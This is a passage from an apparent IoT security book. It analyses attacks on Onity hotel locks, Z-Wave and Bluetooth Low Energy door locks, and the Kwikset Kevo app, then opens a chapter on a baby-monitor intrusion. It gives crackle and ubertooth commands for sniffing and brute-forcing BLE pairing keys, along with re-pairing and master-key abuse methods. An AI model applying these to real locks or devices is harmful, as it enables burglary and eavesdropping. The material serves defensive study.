aware of how easy it is to pick locks using different techniques. Many states and countries
have combatted the prevalence of lock picking tools by issuing regulations that prohibit
the possession of these tools. As you can imagine, the mere existence of regulations is
unlikely to deter a malicious entity who might want to gain physical access to a given
premises.
Looking into the future of IoT-enabled devices, it becomes important for us move be‐
yond traditional physical lock picking and analyze electronic mechanisms that can put
us in a state of higher risk. This chapter takes a look at the security surrounding existing
electronic door locks, their wireless mechanisms, and their integration with mobile
devices. We will step through these topics in the next few sections and ultimately
demonstrate the current security mechanisms (or lack thereof) in electronic door locks.
After establishing the bad security decisions manufacturers might be making, we will
45

be more aware of potential risks and have a better idea of what securing these types of
locks will require in the future.
Hotel Door Locks and Magnetic Stripes
One of the most popular door-lock vulnerabilities, discovered by researcher Cody Bro‐
cious, affects millions of door locks installed in hotels around the world. Given its po‐
tential impact, no conversation on the topic is complete without a discussion of it. In
fact, after Brocious exposed this issue at the Black Hat security conference in July 2012,
hotels experienced actual cases of intruders abusing this flaw to enter hotel rooms and
steal property. Brocious’s work is popular in the information security community be‐
cuase it abuses basic security design flaws, so it is a perfect place to begin understanding
security issues surrounding electronic door locks.
The Onity Door Lock
The Onity HT door lock is extremely popular. If you’ve stayed at hotels, you’ve likely
encountered it and implicitly relied upon its mechanisms for your safety and privacy.
As shown in Figure 2-1, the Onity lock consists of a magnetic key-card reader. Hotel
guests are issued magnetic key-cards, which open the lock when swiped through the
reader. Hotel employees can issue these cards to guests upon check-in or when a guest
requests an additional card. The hotel can issue master keys to employees, such as house-
cleaning staff, that can open multiple doors.
46 
| 
Chapter 2: Electronic Lock Picking: Abusing Door Locks to Compromise Physical Security

Figure 2-1. The Onity door lock
Hotel Door Locks and Magnetic Stripes 
| 
47

Though the Onity lock employs a traditional mechanism of using magnetic cards as
keys, it is important to study, because the next generation of IoT-based door locks are
likely to employ a hybrid approach that preserves traditional mechanisms (physical keys
and magnetic-stripe cards) along with smarter methods to include wireless authenti‐
cation and electronic keys, which we will study in the following sections of this chapter.
Security issues surrounding the Onity lock are also important to understand because
they lay the foundation for understanding fundamental security design flaws that can
potentially be exploited to impact millions of locks deployed worldwide. We must strive
to prevent such scenarios in the future.
The Magnetic Stripe
We’ve all come across cards with magnetic stripes multiple times in our lives. From
credit cards to mass-transit tickets to hotel room keys, we’ve come to depend upon cards
with magnetic stripes for access to services and physical places. Figure 2-2 illustrates
the back side of a typical credit card with a magnetic stripe (also known as a mag‐
stripe). The label (1) shows the megnetic stripe, while (2) is the signature strip and (3)
represents the CVC code. The scope of our discussion in the following sections pertains
to hotel-room key cards, which typically have only the magnetic strip on the back with
the logo of the hotel in the front.
Figure 2-2. Card with magnetic stripe
Typically, magstripes contain three distinct tracks that can store different blocks of data.
Tracks 1 and 2 are commonly used by the financial industry to issue ATM, eebit, and
credit cards, yet there are no restrictions on which particular track an entity may use.
The Onity door lock happens to use Track 3, which contains the following sequence of
data:
48 
| 
Chapter 2: Electronic Lock Picking: Abusing Door Locks to Compromise Physical Security

16-bit ident value
An identity value to keep track of the door the key is assigned to and which copy
the card is. In the case of a master card created for hotel personnel, a value repre‐
senting the identity of the hotel employee is stored instead of the door identifier.
When checking into the hotel, the first key created will have the copy identifier set
to 0, while subsequent copies will add 1 to this number to identify the number of
the copy.
8-bit flags byte
Used to set miscellaneous values in one byte for various other miscellaneous op‐
tions.
16-bit expiration date
Set upon guest check-in to indicate the length of time the card will be valid.
24-bit unknown field
Set to all +0+s.
24-bit keycode value
This value is programmed into individual locks. When this is done, the locks are
also configured to have a look-ahead value. For example, if a lock was programmed
with a keycode value of 100 and a look-ahead value of 50, it would accept integers
between 100 and 150 as valid keycode values. Every time a valid card is inserted,
the lock resets its keycode value to the value of the card. In this way, the lock in‐
crements its keycode value to make sure older cards are invalidated. Note that spe‐
cific keycode values representing master keys are also stored in the locks. The hotel
may decide to segment areas with different master keycodes so that only certain
areas of the hotel can be opened with any given master keycard.
The values are encrypted using the sitecode value, which is a unique 32-bit value ran‐
domly assigned by Onity to identify the hotel property. If this value is compromised, it
can be abused to generate arbitrary magnetic cards to unlock doors and also to program
the locks themselves (discussed in following sections).
The actual encryption algorithm that uses the sitecode value is documented in Appendix
B of Cody Brocious’s whitepaper.
In addition to typical key cards described here, the system also includes programming
and spare cards. When a programming card is swiped through the lock followed by a
spare card, the spare card becomes the guest card for the lock. These cards are used
when the encoding machine (used to program the guest cards) isn’t working. Program‐
ming cards are also encrypted using the sitecode value, while the spare cards are not
encrypted. When spare cards are created in a batch (to be used with programming
cards), each subsequent card has an incremental value.
Hotel Door Locks and Magnetic Stripes 
| 
49

When a guest inserts the card into the lock, the data on the card is decrypted using the
sitecode. Next, the expiration date is checked to see if it is still valid. Finally, the keycode
value is checked and the lock opens if it is within the look-ahead range.
The Programming Port
A programming port, accessible using a DC adapter, is located at the bottom right of
the lock. A portable programmer (PP) device is used to program the lock when it is
installed and when batteries are replaced, which causes memory to reset. Upon instal‐
lation, the PP is used to configure the lock with its ident value and keycode value.
The PP can also be used to connect to the lock and issue it commands, such as a com‐
mand to open, but the PP would also need to supply the correct sitekey.
The PP can also be used to read blocks of memory from the lock using the programming
port.
Security Issues
Brocious’s whitepaper describes various security issues pertaining to Onity locks. These
issues are important for us to understand because they affect millions of hotel room
doors outfitted with the these locks. They also represent the lack of basic security con‐
trols that other lock makers should avoid.
Microcontroller Vulnerability
If the sitecode is known, it is possible to open the lock by connecting to the programming
port using a simple microcontroller, such as the inexpensive ($50 or less) and popular
Arduino.
Cody Brocious describes the Arduino code (also known as a sketch) required to open
the lock in Appendix A of his whitepaper. Basically, Brocious’s sketch takes advantage
of the fact that any part of memory can be read from the programming port using the
Arduino. Brocious uses this to read the sitecode from memory and then invokes the
open command along with the sitecode, which causes the lock to open.
This is a severe security issue, given the millions of Onity locks installed in various
locations around the world. Armed with only an Arduino microcontroller purchased
at a neighborhood electronic store, anyone can walk up to a door protected by the lock
and open it. In fact, famous hotel chains such as Holiday Inn, Extended Stay, Quality
Inn, Laquinta Inn, Red Roof Inn, Motel Six, Budget Inn, Courtyard By Marriot, and
Comfort Inn have reported burglaries as a result of this particular security issue.
50 
| 
Chapter 2: Electronic Lock Picking: Abusing Door Locks to Compromise Physical Security

Master Keycode in Lock Memory
Master keycards can be created by reading the master keycode from the lock memory.
This value, in addition to the sitecode that can also be read from memory, can be used
to construct master keys. As stated previously, the hotel may choose to segment locks
in different sections of the venue with different master keys, so the master keycard can
be limited to the particular section of the hotel real estate.
This is also a severe issue, because a one-time creation of the master keycard can allow
a potential intruder access to an entire section of the hotel.
Unencrypted Spare Cards
As stated earlier, each subsequent spare card is created with an incremental value and
is not encrypted. These spare cards are used when the encoding machine is not working.
So, if an intruder were to get hold of a spare card with the value 500, he or she could
create another card with the value 499 and 501 and attempt to open other locks.
Of course, it is not possible to easily ascertain exactly what doors the newly created spare
card might open, which makes this attack a little difficult to execute.
Vendor Response
On July 24, 2012, Brocious revealed his research and his paper to the world, providing
anyone armed with a cheap Arduino board with all the information needed to break
into millions of hotel rooms. This also alerted the public to the risk they were taking
when staying in hotel rooms protected by the Onity lock. Onity was also put under
scrutiny by the public and hotel owners, who looked to them to provide a solution to
the problem.
On July 25, 2012 and August 13, 2012, Onity issued a response, stating that they would
issue a firmware upgrade to alleviate the issue. They also promised to insert a mechanical
cap into the programming port to prevent access to the port, along with an additional
TORX screw to secure the mechanical cap.
There are several problems with Onity’s statements. First, a mechanical cap makes it
only slightly harder for the average criminal to break in, as they now need only a few
additional physical tools (TORX-based screwdrivers are available for a few dollars in
electronic and grocery stores) to break it open and eventually gain access to the pro‐
gramming port. Also, as pointed out in Brocious’s rebuttal, the design of the Onity lock
does not allow for a true firmware update without updating the circuit board. Therefore,
in reality, hotel owners would have to replace the actual circuit board (which is more
costly on millions of installed locks) rather than issue a simple firmware update.
Hotel Door Locks and Magnetic Stripes 
| 
51

A few weeks after posting their response, Onity removed every trace of it from their
website. Further investigation revealed that Onity had been working with certain hotel
chains to replace circuit boards, depending upon the year the lock was manufactured.
This particular set of security concerns targeting a specific manufacturer reveals critical
issues we must all be cognizant of when it comes to the design of mass-produced devices,
the cost of fixes, and, ultimately, the negative effect on brand reputation for both the
manufacturer (Onity) and the client (hotel chains upon whom patrons depend for their
security). First, it is vital that mass-produced devices contain the ability to issue
software-related fixes whenever possible, because it is less costly and therefore more
scalable. Second, given the interest of independent researchers on security analysis,
vendors need to be more transparent and engaging with the research community, to
make sure they are promoting ethics and the trust of their ultimate consumers.
In this section, we took a look at one of the more popular door locks that millions of
people depend on for their safety. Although the type of lock we looked at can be deemed
traditional (magnetic-stripe based), it is still an important lesson for the future, because
the next generation of locks are likely to include a hybrid magnetic stripes and additional
mechanisms for electronic keys. The lessons learned in this section provide a solid
foundation to continue our quest into the analysis of door locks that include wireless
and electronic key functionality, as covered in the following sections.
The Case of Z-Wave-Enabled Door Locks
Z-Wave is a wireless protocol specifically designed for home automation. It transmits
data in small chunks, so it can use less power and can easily be embedded in devices
such as light bulbs, entertainment systems, and various household appliances.
The Z-Wave protocol was first developed by a company called Zen-Sys, which was
acquired by Sigma Designs in 2008. The Z-Wave standard is maintained by a consortium
of manufacturers as part of the Z-Wave Alliance forum.
To get started with Z-Wave, you first need to buy a developer kit from Sigma Designs
and then you can download the Z-Wave SDK. To become Z-Wave certified, you must
be a member of the Z-Wave Alliance.
In this section, we will discuss a specific security vulnerability discovered in the in Z-
Wave implementation by Sigma Designs that affected door locks. This will provide a
good perspective on critical security issues that have impacted the secure design of
wireless door locks built with Z-Wave.
Z-Wave Protocol and Implementation Analysis
The Z-Wave protocol consists of the following layers:
52 
| 
Chapter 2: Electronic Lock Picking: Abusing Door Locks to Compromise Physical Security

Physical layer
This layer consists of physical layer specifications for radio communication.
Transport layer
This layer is responsible for packet transmission and retransmission, wnen the
packet sent was not acknowledged to have been delivered to the destination. Devices
with limited power supply, such as battery-powered door locks, are often designed
to enter sleep mode. Such devices turn on their radio on a periodic basis to look for
incoming data. The transport layer is responsible for coordinating the waking up
of the device when such an event occurs. In this case, the transmitting device sends
several back-to-back packets in 100ms intervals to make sure the sleeping device
notices one of the packets.
Network layer
Z-Wave uses mesh-based networking that enables any node to talk to nearby nodes
directly or through available relays. Nodes communicate directly if they are within
range, or they can link with another node that has access to the destination node
to exchange information. Every Z-Wave network can have up to 232 devices and
one primary controller device. This flexibility, along with the low-power approach,
makes Z-Wave attractive for devices used for home automation.
Application layer
This layer is responsible for parsing the packet and decoding the Z-Wave commands
and parameters. The Z-Wave SDK can be used to parse the incoming payload,
including the command class specified. Z-Wave command classes define specific
functionality, such as alarm sensors, door locks, thermostats, and others. Each
command class, in turn, can contain multiple commands, such as to get the tem‐
perature of a thermostat or to set the thermostat to a specific temperature.
In July 2013, Security researchers Behrang Fouladi and Sahand Ghanoun released a
whitepaper that evaluated security implications surrounding the Z-Wave protocol af‐
fecting door locks. The authors also released a free tool called Z-Force, which lets you
analyze captured Z-Wave traffic and transmit specifically crafted packets. The only ad‐
ditional hardware component required is the $75 CC1110 RF Transceiver.
In their quest to analyze the Z-Wave protocol, Fouladi and Ghanoun studied a particular
door lock that used Z-Wave. Their research focused on the application layer of Z-Wave,
where they found that that the first time the lock was paired with a controller (such as
the Mi Casa Verde controller), the controller and the lock exchanged encryption keys.
The keys are generated using a hardware-based pseudorandom number generator
(PRNG) on the Z-Wave chip and encrypted using a hard-coded temporary default key
in the chip’s firmware (the value of which was found to be four bytes of zero).
After successful key generation takes place, Fouladi and Ghanoun found that two new
keys were created using the exchanged keys as input. First, a frame encryption key is
The Case of Z-Wave-Enabled Door Locks 
| 
53

created to encrypt the data payloads in subsequent communications. Next, a data origin
authentication key is created to ensure that an external entity cannot replay the network
packet, because it uses a message authentication code (MAC) algorithm that makes it
difficult for a rogue entity to capture and replay the traffic. Fouladi and Ghanoun’s paper
provides a detailed cryptographic analysis.
Exploiting Key Exchange Vulnerability
Fouladi and Ghanoun found that the Z-Wave implementation had a severe vulnerability
pertaining to initiating the original key-exchange protocol between a given lock and the
controller. They found that even after the lock was paired wih a controller, they could
transmit a key-exchange packet that caused the lock to accept a brand-new shared key
submitted by the attacker.
The flaw here is that, once paired with the controller, the lock should check the current
key in its electrically erasable programmable read-only memory (EEPROM) and load
the existing key if one exists. The lack of this fundamental validation step allowed Fou‐
ladi and Ghanoun to arbitrary open door door locks enabled by Sigma Design’s Z-Wave
implementation.
Another side effect of this attack was that, since the shared keys on the lock were replaced
with those of the attacker, events sent to the controller (such as “Door is Open”) will be
rejected by the controller, because the keys shared between the lock and the controller
are different, causing for the authenticity check to be rejected. This, in turn, creates a
situation in which any logic built into the controller to alert owners of the door being
open will be bypassed.
The research and findings by Fouladi and Ghanoun are a good example of how a simple
validation check can have severe implications on the physical security of our homes and
offices, where we rely upon door locks to help preserve the safety of ourselves and our
loved ones. This incident shows the need for not just lock manufacturers, but also for
those who implement firmware and radio protocols, to make sure their design is sound
when it comes to security. In this case, a single oversight from the Z-Wave protocol
implementer deemed the design of various locks insecure.
According to Fouladi and Ghanoun, Sigma Designs was responsive and worked with
them to figure out how to best verify and proceed with the remediation of the vulner‐
ability. Although this is a positive gesture as part of Sigma Designs, the issue of firmware
updates still stands. Managers of physical facilities and homes do not usually have a
process of checking for firmware updates and applying them to their door locks and
controllers. In many cases, the functionality to update is not implemented or is too
expensive to apply in scale.
54 
| 
Chapter 2: Electronic Lock Picking: Abusing Door Locks to Compromise Physical Security

The main point to take away, as we look into physical security in the IoT space, is that
a simple oversight can continue to leave millions of homes vulnerable, given the com‐
plexity and cost of remediation.
Bluetooth Low Energy and Unlocking Via Mobile Apps
So far, we’ve studied research and attacks pertaining to magnetic-stripe keycard-enabled
doors, providing a solid foundation to understand basic attacks against popular door
locks. We’ve also looked at Z-Wave-enabled door locks and seen how a simple mistake
in the implementation of a protocol can deem door locks insecure.
In this section, we will take a look at the Kwikset Kevo door lock, shown in Figure 2-3,
which uses Bluetooth Low Energy (BLE). What makes this lock particularly interesting,
from an IoT perspective, is the ability to control it using an iPhone app.
Figure 2-3. The Kwikset Kevo door lock
Here we will discuss known BLE weaknesses and how to capture wireless traffic, but we
will pay particular attention to the iOS app, which sets this lock apart from the ones we
have looked at so far.
Bluetooth Low Energy and Unlocking Via Mobile Apps 
| 
55

Understanding Weaknesses in BLE and Using Packet-Capture Tools
Established in 2010 as part of the Bluetooth 4.0 standard, BLE has received phenomenal
support in the industry because it uses low power, which is extremely important in
devices such as smart phones, tablets, and IoT devices. Bluetooth hardware chips are
available for as little as $2, which puts it at a significant advantage over competing
protocols such as ZigBee and Z-Wave.
The Bluetooth Special Interest group maintains the current Bluetooth specification.
Note that the specification covers classic Bluetooth as well as BLE, and these two stand‐
ards are not compatible with each other (i.e., Bluetooth devices implemented on spec‐
ification prior to 4.0 cannot communicate with another BLE device).
BLE operates in the 2.4 GHz spectrum, which is split into 40 channels, 37 of which are
used to transmit data, while the other three are used by unconnected devices to broad‐
cast device information and establish connections. Devices can broadcast data to any
scanning device or receiver in listening range. This allows devices to send one-way data
to other devices.
The broadcasting device sends an advertising packet, which contains a 31-byte payload
that includes information about the broadcasting device and also any additional custom
information. When 31 bytes is not enough to transmit the necessary information, BLE
supports a mechanism called Scan Response, which listening devices can use to request
a second advertising frame that is also 31 bytes long, bringing the total to 62 bytes.
Note that the advertising packets used to broadcast do not contain
any security mechanisms, so sensitive information should not be sent
during broadcast.
To transmit data in both directions, devices need to establish a connection between a
master device and a slave device. The master device picks up advertising packets trans‐
mitted by the slave and requests the slave to establish a permanent connection. A single
device can act as a master and slave at the same time. A slave device can connect to
multiple master devices, and a master device can connect to multiple slave devices.
BLE packets can be captured using a USB-based Ubertooth One device, along with the
Ubertooth suite of software tools that can be built using the build guide. These tools
include a spectrum analyzer (shown in Figure 2-4), which you should run immediately
after purchasing an Ubertooth One, to make sure things are working correctly.
56 
| 
Chapter 2: Electronic Lock Picking: Abusing Door Locks to Compromise Physical Security

Figure 2-4. Ubertooth Spectrum Analyzer
The Ubertooth project aslo includes a tool called ubertooth-btle, which can be used
to capture BLE traffic by running the following command:
[bash]$ ubertooth-btle -f -c capture.cap
The -f flag specifies that the tool should follow new BLE connections as they are es‐
tablished, and the -c flag specifies the name of the file the captured data should be
written to. This file can be opened using the Wireshark network sniffer, as shown in
Figure 2-5.
Bluetooth Low Energy and Unlocking Via Mobile Apps 
| 
57

Figure 2-5. BLE advertising packet analysis in Wireshark
Every BLE packet contains an access address (AA), which is a unique identifier to refer
to a specific connection. When a device transmits an advertising packet, a fixed AA of
0x8e89bed6 is used as the AA (as shown in Figure 2-5).
It is possible to mimic BLE devices by using the LightBlue iOS app on an iPhone, as
shown in Figure 2-6. This is useful to test Ubertooth One functionality and make sure
the capture tools are working. Notice that the advertising virtual device with name Blood
Pressure shown in Figure 2-6 is captured in the Wireshark analysis shown in Figure 2-5.
58 
| 
Chapter 2: Electronic Lock Picking: Abusing Door Locks to Compromise Physical Security

Figure 2-6. Simulating a BLE device with the LightBlue iOS app
Bluetooth Low Energy and Unlocking Via Mobile Apps 
| 
59

In his whitepaper “Bluetooth: With Low Energy Comes Low Security”, researcher Mike
Ryan describes how to capture BLE connections. Essentially, connections hop across
the 37 channels reserved for transmission using a hopIncrement value. The nextChan
nel value is calculated as follows:
nextChannel   channel + hopIncrement (mod 37)
The master and the slave use this formula to calculate the next channel and hop to it at
the same time. The master transmits a packet, followed by the slave. If there is no data
to transmit, they will issue a network packet with no data. Therefore, in order to sniff
BLE conections, the ubertooth-btle tool also hops along the same sequence of chan‐
nels when the -f flag is specified.
In his paper, Ryan discloses a critical security issue in BLE that is important to under‐
stand: the key-exchange protocol used by BLE is vulnerable to brute-force attacks. The
master and the slave device can use encryption to secure the data being transmitted. In
order to do this, they must establish a shared secret known as the long-term key (LTK).
In most cases, the master and the slave reuse the LTK for subsequent connections. The
key-exchange protocol begins by selecting a temporary key (TK) based on the well-
respected AES encryption protocol.
According to the BLE specification, the value of the TK is 0 if the Just Works mode is
selected. This mode is used by devices that have little to no display or input mechanism,
so the pairing is automatic. Otherwise, a value between 0 and 999999 is used. This is a
more common method, in which the user is asked to verify the number generated on
both the slave and the master devices using a display. Once the TK is calculated, the
master and the slave use the TK to establish a short-term key (STK). The STK is used
to eventually establish the LTK.
Ryan has released a tool called crackle, which takes captured BLE data and attempts
to brute-force it using a TK value of 0 through 999999. Once the TK is found, the STK
can easily be verified by decrypting it with the TK. Finally, the LTK can be obtained by
decrypting it using the STK. Assuming the captured data is stored in a file called cap‐
ture.pcap, the following command runs the crackle tool:
[bash]$ crackle -i capture.pcap -o decrypted.pcap
TK found: 249592
LTK found: 26db138d0aa63a12dd596228577c4731
Done, processed 106 total packets, decrypted 19
Now a tool such as Wireshark can open the decrypted.pcap file, which contains data in
clear text. Note that Ryan’s brute-force method is not effective against out-of-band
(OOB) mode, in which a 128-bit key is exchanged through a mode other than BLE. In
this case, brute-forcing the entire 128-bit key space can be time consuming and inef‐
fective. But most devices use either the Just Works mode or the six-digit-value mode,
so a majority of BLE devices are vulnerable.
60 
| 
Chapter 2: Electronic Lock Picking: Abusing Door Locks to Compromise Physical Security

Anyone investigating a BLE IoT device should be familiar with Ryan’s research and the
Ubertooth set of tools, because they are indispensable for analysis of network traffic and
testing if the products in question are securely designed. Furthermore, as of this writing,
the current Bluetooth specification (4.1) does not address Ryan’s brute-force attacks, so
devices that rely upon BLE encryption remain vulnerable.
Kevo Kwikset Mobile App Insecurities
The Kwikset Kevo lock shown in Figure 2-3 can be operated via the companion Kevo
iOS app on an iPhone.
Upon first launch, the user is asked to specify an email address and password. As shown
in Figure 2-7, passwords must be at least eight characters long and include at least one
number.
Bluetooth Low Energy and Unlocking Via Mobile Apps 
| 
61

Figure 2-7. Minimum password requirements in the Kevo iPhone app
62 
| 
Chapter 2: Electronic Lock Picking: Abusing Door Locks to Compromise Physical Security

As shown in Figure 2-8, Kevo has implemented a policy that locks out the account if an
incorrect password is attempted six times in a row. The lockout is effective for 24 hours.
Figure 2-8. Kevo account lockout after six incorrect attempts
If the user has forgotten his or her password, Kevo requires a correct answer to one of
the security questions associated with the account (Figure 2-9). These questions are
selected by the Kevo app, which prompts the user to answer them when creating the
account.
Bluetooth Low Energy and Unlocking Via Mobile Apps 
| 
63

Figure 2-9. Kevo security question for password reset
If a malicious person has temporarily gained access to the user’s email account, he or
she can attempt to guess the answer or obtain it by social engineering the target via
phishing attacks. While Kevo has done a good job with respect to requiring password
complexity, implementing a lockout, and requiring a secret answer to a question, users
should be aware that this type of information can and is routinely stolen by means of
phishing attacks and malware.
The lock also implements a mechanism that allows users to send others electronic keys.
All you have to do is provide the individual’s email address and that person will receive
an email from Kevo, as shown in Figure 2-10. To unlock the lock, the target individual
must first set up an account with the Kevo iPhone app and verify their email.
64 
| 
Chapter 2: Electronic Lock Picking: Abusing Door Locks to Compromise Physical Security

Figure 2-10. Sending electronic keys to external parties
The security risk here is the possibility of a malicious entity having gained temporary
access to the target individual’s email account. Since the target has to set up a new
account and answer the security questions for the first time, the malicious entity can
pick arbitrary answers to the security questions, which will in turn lock out the legitimate
user from resetting the password.
The lock contains a program button that is easily available by lifting the indoor cover.
As shown in Figure 2-11, the user must press this button and hold the phone next to
the lock to allow the phone to open the lock. Once this is set up, the user needs to touch
the external face of the lock to wake it up. When this happens, the lock communicates
with the iPhone using BLE and unlocks (or locks) when a preprogrammed iPhone is
found within the vicinity.
Bluetooth Low Energy and Unlocking Via Mobile Apps 
| 
65

Figure 2-11. Program button on physical lock to associate an iPhone
66 
| 
Chapter 2: Electronic Lock Picking: Abusing Door Locks to Compromise Physical Security

However, someone with a new iPhone that has never been programmed can just down‐
load the Kevo app and open the door, as long as they are able to guess or obtain the
password and sign into the app. Though Kevo has implemented security mechanisms
to control the password, a case could be made that this could be made more secure by
requiring the pairing of a new device to use the program button even when the password
is known.
This brings us to the issue of physical access to the lock itself. Lock bumping using
various methods is a known art and technique that many individuals have perfected. In
fact, when the Kevo lock itself was tested against bumping, individuals were able to
bypass the physical key mechanism.
Given that physical bumping is a known issue affecting many locks, the mobile app
feature implemented in Kevo can allow someone with an iPhone and temporary physical
access to the lock to reprogram the lock within seconds to associate with a new lock—
in essence, virtually bumping the lock. This can easily be done by holding the reset
button shown in Figure 2-12 for a few seconds and then following the steps in
Figure 2-11 to associate the lock with a new device. Someone with temporary physical
access to the lock can easily do this without having the skills to physically bump the
lock, which requires additional training and tools.
Bluetooth Low Energy and Unlocking Via Mobile Apps 
| 
67

Figure 2-12. Reset button on physical lock
A caveat to this is that the individual would have to be inside the location being pro‐
tected, because the reset and program buttons are internally facing. However, the risk
68 
| 
Chapter 2: Electronic Lock Picking: Abusing Door Locks to Compromise Physical Security

here is in temporary workers (such as cleaning or maintenance staff), who might be
around the home for a brief amount of time and can then easily abuse this feature to
re-enter the house without permission. Furthermore, they can issue additional elec‐
tronic keys to others.
This section provides a good example of issues we need to think through as we increas‐
ingly become dependent on our physical safety using mobile apps. Attacks such as
password guessing and phishing have traditionally compromised our digital informa‐
tion, yet the same attacks on platforms such as the Kevo iPhone app can compromise
the physical safety of our premises.
Lock manufacturers need to be increasingly cognizant of these threats and implement
tighter controls. Given the physical nature of firmware within IoT devices, the situation
is complicated by the fact that, even when updates are offered using the application
interface, many users have the tendency to delay the update in interest of their time.
Many people don’t want to have to deal with waiting for their door lock to install a
security patch while they are in the middle of leaving or entering their house to attend
to a chore.
This means that IoT-based manufacturers such as Kevo must strive to implement the
right security features in the initial versions of their product. This is not easy, because
it is hard to perfect security, so users of these devices should be aware of potential risks
such as the ones outlined in this section.
Conclusion
Human beings have the understandable tendency to protect our belongings, our privacy,
and our physical security. We invented door locks thousands of years ago and still de‐
pend upon the concept of doors and locks to protect our spaces.
The case for abuse of the best of locks using lock-picking tools is not news to most of
us. However, with the advent of electronic door locks in the IoT space, we have to be
aware of the decisions we are making today from a security perspective and how our
decisions are likely to influence our future in an impactful way.
In the case of the Onity door lock, we’ve shown how a poor implementation of security
can put millions of physical spaces at risk and how this situation has been exploited in
various burglaries. This is also an example of how costly security fixes can be when
people have to manually go up to millions of door locks and issue an update. Further‐
more, the Onity example is a lesson for door lock manufacturers to do a better job of
being transparent to their customers and the work of independent security researchers.
The Z-Wave example demonstrated how the designer of a network protocol can inad‐
vertently put a large number of door locks at risk, such that they can be arbitrarily opened
by simple hardware and software tools. When we think of IoT security, we ought to
Conclusion 
| 
69

include and inspect the design principles being deployed by not just the ultimate phys‐
ical manufacturers, but also organizations that supply SDKs and protocols that enable
these devices.
Finally, in the case of BLE, we looked at the important research from Mike Ryan that
has put many devices at risk, given the ability to brute-force connections written using
the protocol. Additionally, we glanced upon the design of the Kevo door lock, which
includes functionality to use iPhones to unlock doors that subject it to the same type of
traditional attack vectors such as password guessing and phishing. We also looked at
how the ability to reprogram the door lock can be viewed as a case of virtual lock picking,
where the malicious entity has brief physical access to the lock, but in this case, the entity
needs only an iPhone in lieu of a lesson in lock picking.
We hope to look forward to a bright future in which our IoT-based ecosystem enhance
our lives and help us protect our spaces. This chapter provides the current state of
popular door locks in the market and research that has deemed some of their mecha‐
nisms vulnerable. These lessons are fundamental in our understanding of what we need
to correct in our approach to securing IoT door locks today as we continue to refine
devices that will be in our lives in the future.
70 
| 
Chapter 2: Electronic Lock Picking: Abusing Door Locks to Compromise Physical Security

CHAPTER 3
Assaulting the Radio Nurse: Breaching
Baby Monitors and One Other Thing
The license plate 4U-13-41-N.Y belonged to a blue Dodge sedan owned by a gentleman
by the name of Richard Hauptmann. Hauptmann was accused and later executed for
kidnapping and murdering 20-month-old Charles Augustus Lindbergh, Jr., the son of
well-known aviator Charles Lindbergh and Anne Morrow Lindbergh.
On the evening of March 1, 1932, the toddler was abducted from his family home in
East Amwell, New Jersey. His body was discovered two months later. The cause of death
was a massive skull fracture. The investigation spanned two years. 250,000 copies of
serial numbers associated with ransom bills were sent to businesses across New York
City. Hauptmann was finally caught by a bank teller who recognized one of the bills that
had the license plate number scribbled in the margin of the note. Apparently, a gas
station manager had scribbled it in because he felt the customer issuing the bill was
acting suspicious and suspected him to be a counterfeiter.
The Lindbergh kidnapping was well publicized and the conclusion wasn’t without con‐
troversy. One of the outcomes after the case was the first baby monitor, called the “Radio
Nurse,” created by the company Zenith. The company’s president, Eugene F. McDonald
Jr., felt compelled to produce a solution that would reduce cases like that of Lindbergh
and asked the engineers at Zenith to come up with a product. They ended up designing
a system that included the “Guardian Ear” transmitter, which was to be placed near by
the child’s crib, and a receiver device called the “Radio Nurse,” to be placed in a location
near the parents or guardians.
The idea of a baby monitor seems so natural that, if it weren’t for the inspiration from
the Lindbergh case, someone else surely would have designed it later. Nonetheless, the
important point here is that baby monitors fulfill a critical need: the increased ability
for parents to keep a watch on their loved ones from a distance. In essence, baby mon‐
itors can be considered potential life-saving devices.
71

Given the fact that baby monitors are relied upon immensely by parents and guardians,
it becomes important to consider the security of these devices, to make sure they don’t
contain flaws that can lead to security or privacy implications. Traditional baby monitors
relied upon radio waves that limited their range, but the current generation of devices,
such as the Foscam baby monitors and the Belkin WeMo baby monitor, are IoT based.
These devices connect to a WiFi network and allow the guardians to listen in from
anywhere in the world. In this chapter, we will take a look at certain security and privacy
issues pertaining to such devices, to expose the risks associated current generation baby
monitors. This will help determine ways to limit attack vectors in current and future
generation products.
We will also take a look at another product designed by Belkin: the WeMo Switch, which
can be used to remotely turn power on or off in a connected appliance. The intention
here is to study similarities and differences in design from a security perspective when
the same company designs the products. Given cultural synergies and discord between
corporate structures aligned under the same corporation, similar security issues tend
to exist in different products.
The Foscam Incident
Anyone with a cordless phone, most popular in the ’80s and ’90s, can speak about
interference with other cordless phones. Many people have experienced the situation
in which their cordless phones pick up signals from their neighbor’s cordless phone.
This is because the earlier types of cordless phones operated on fixed radio frequencies.
Initially, the bet was that neighbors were unlikely to own similar cordless phones. Later
on, the Digital Spread Spectrum was introduced to allow the information to be spread
over different frequencies, making it hard for others to pick up on conversations.
Most traditional baby monitors operated on analog frequencies, making it easy for
anyone with a radio scanner to tune in. When it comes to baby monitors, eavesdropping
is perhaps the biggest concern. Initially, not many individuals were aware that purchas‐
ing a simple radio scanner would allow anyone to listen in. However, the traditional
baby monitors required the eavesdropper to be within the vicinity of the home, which
lowered the willingness of a potential intruder to make the trek to listen in, thereby
lowering the probability of a privacy violation.
Fast-forward to today, when many popular baby monitors don’t use radio frequencies.
They rely on WiFi networks, allowing the owners to listen in remotely from anywhere
in the world. This tremendously increases the probability of a security defect being
exploited. Given that the device is connected to the Internet, anyone in the world with
access to a computer can potentially launch a targeted eavesdropping attack. In the next
few paragraphs, we will discuss a specific incident in which such an attack occured. We
will also pick upon the Belkin WeMo baby monitor to dissect its technical design and
discuss security improvements.
72 
| 
Chapter 3: Assaulting the Radio Nurse: Breaching Baby Monitors and One Other Thing

In August 2013, Mark Gilbert was busy doing dishes in his home when he suddenly
heard noises coming from his daughter Allyson’s bedroom while she was sleeping. As
Mark and his wife approached Allyson’s room, they heard a stranger shouting expletives
at them, calling Mark a “stupid moron” and his wife a “bitch.” Mark noticed the baby
monitor, equipped with a video camera, swivel toward him and his wife. At this point,
realizing that an intruder had compromised the device, he quickly disconnected it.
Take a moment to consider how severely unnerving this incident was to the Gilbert
family. Imagine how invasive it must feel to be winding up the day in a quiet neighbor‐
hood and have a complete stranger’s voice shout obscenities out of nowhere in the
supposed privacy of your own home. Imagine the shock of having this originate from
the bedroom of an infant.
At first glance, one might assume that Mark Gilbert chose a weak password for his WiFi
network, and perhaps the intruder within range of his home guessed it. Or perhaps
Mark never changed the default credentials (username: “admin”, password: [blank]),
allowing the intruder easy access to the device. However, according to Mark, he had
indeed changed the default credentials and secured his WiFi with a strong password.
